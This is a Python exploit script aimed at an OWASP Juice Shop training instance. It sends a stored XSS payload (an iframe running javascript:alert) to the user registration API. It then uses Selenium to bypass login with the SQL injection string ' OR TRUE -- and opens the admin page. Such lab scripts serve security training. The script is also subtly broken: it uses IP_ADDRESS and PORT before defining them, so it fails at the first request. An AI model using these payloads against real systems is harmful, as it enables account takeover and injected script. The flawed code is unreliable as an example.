import requests
import os
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

try:
	headers = {
		'Content-Type': 'application/json'
	}

	# Define the API endpoint URL
	url = f"http://{IP_ADDRESS}:{PORT}/api/Users"

	# Prepare the JSON payload for the request body
	payload = {"email": "<iframe src=\"javascript:alert(`xss`)\">", "password": "xss"}

	# Send the POST request with the JSON payload
	response = requests.post(url, json=payload, headers=headers)

	# Print the response status code and JSON content
	print(f"Status Code: {response.status_code}")
	print(f"Response Body: {response.json()}")

	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	driver = webdriver.Chrome()
	driver.get(f"http://{IP_ADDRESS}:{PORT}")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("' OR TRUE --")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
	WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()
	time.sleep(3)
	driver.get(f"http://{IP_ADDRESS}:{PORT}/#/administration")
	
	input("Press Enter...")

finally:
  driver.quit()
